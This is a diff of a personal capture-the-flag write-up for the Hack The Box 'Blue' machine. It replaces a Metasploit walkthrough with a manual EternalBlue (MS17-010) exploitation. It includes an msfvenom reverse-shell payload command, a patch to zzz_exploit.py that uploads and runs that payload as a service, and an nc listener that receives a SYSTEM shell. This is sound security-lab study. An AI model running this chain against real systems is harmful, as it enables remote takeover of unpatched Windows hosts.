-[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-
-meterpreter >
+python ./checker.py 
+Traceback (most recent call last):
+  File "./checker.py", line 1, in <module>
+    from mysmb import MYSMB
+  File "/home/kali/Workspace/HackTheBox/Machines/Blue/tools/MS17-010/mysmb.py", line 3, in <module>
+    from impacket import smb, smbconnection
+ImportError: No module named impacket
 ```
 
-I then switched the shell to a cmd windows shell:
+We need to install Impacket inside our virtual environment:
+```bash
+pip install impacket==0.9.22	# 0.9.24 relies on OpenSSL version incompatible with 2.7
+python ./checker.py $ip
+	Target OS: Windows 7 Professional 7601 Service Pack 1
+	...
+```
+
+Everything is ready to go!
+
+#### Running The Exploits
+With my enviroment set up, I can return to testing the machine.
+The "checker.py" script is used to check whether the machine is truly vulnerable to the CVE.
+Inside the script, there are variables that hold the values of username and password we auth as:
 
 ```bash
-meterpreter > shell
-Process 2308 created.
-Channel 1 created.
+USERNAME = ''
+PASSWORD = ''
+```
+
+I will run the exploit with blank creds, as well as with probably invalid but not blank creds.
+
+```bash
+python ./checker.py $ip
+```
+```bash
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_ACCESS_DENIED
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: STATUS_ACCESS_DENIED
+```
+
+```bash
+python ./checker-blankless-creds.py $ip
+```
+```bash
+Target OS: Windows 7 Professional 7601 Service Pack 1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_OBJECT_NAME_NOT_FOUND
+samr: Ok (64 bit)
+netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
+lsarpc: Ok (64 bit)
+browser: Ok (64 bit)
+```
+
+With blank credentials we get a much more restricted environment than with just invalid creds!
+Anyways, I have now comfirmed that the device is not patched - it is vulnerable.
+
+I will utilize [this tutorial](https://redteamzone.com/EternalBlue/) to gain a shell on the target:
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f exe > shell.exe
+```
+
+```bash
+diff zzz_exploit.py zzz_exploit-modified.py
+```
+```bash
+34,35c34,35
+< USERNAME = ''
+< PASSWORD = ''
+---
+> USERNAME = '1'
+> PASSWORD = '1'
+973,985c973,975
+<       smbConn = conn.get_smbconnection()
+< 
+<       print('creating file c:\\pwned.txt on the target')
+<       tid2 = smbConn.connectTree('C$')
+<       fid2 = smbConn.createFile(tid2, '/pwned.txt')
+<       smbConn.closeFile(tid2, fid2)
+<       smbConn.disconnectTree(tid2)
+< 
+<       #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+<       #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+<       # Note: there are many methods to get shell over SMB admin session
+<       # a simple method to get shell (but easily to be detected by AV) is
+<       # executing binary generated by "msfvenom -f exe-service ..."
+---
+>     smbConn = conn.get_smbconnection()
+>     smb_send_file(smbConn, 'shell.exe', 'C', '/test.exe')
+>     service_exec(conn, r'c:\test.exe')
+```
+
+```bash
+python ./zzz_exploit-modified.py $ip browser
+```
+
+```bash
+nc -lvnp 443
+```
+```bash
+listening on [any] 443 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.40] 49171
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
-C:\Windows\system32>
-```
-
-Running `whoami` revealed that I am already `system` (windows version of Linux's `root`):
-
-```bash
 C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
-
-Getting the was now trivial with the following commands:
-
-```bash
-C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
-C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
-```
-
-
-### ASIDE - dumb nc mistake
-Being unfamiliar with Metasploit, I thought that I needed to setup a nc listener for the reverse shell. This is wrong, as Metasploit will try to set it up itself.
-
-When I created a nc listener:
-
-```bash
-(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ nc -lvnp 1234
-listening on [any] 1234 ...
-
-```
-
-And tried to execute the script I got an error:
-
-```bash
-msf6 exploit(windows/smb/ms17_010_eternalblue) > run
-[-] Handler failed to bind to 10.10.14.19:1234:-  -
-[-] Handler failed to bind to 0.0.0.0:1234:-  -
-[-] 10.10.10.40:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:1234).
-[*] Exploit completed, but no session was created.
-```
-
-_The more I know_
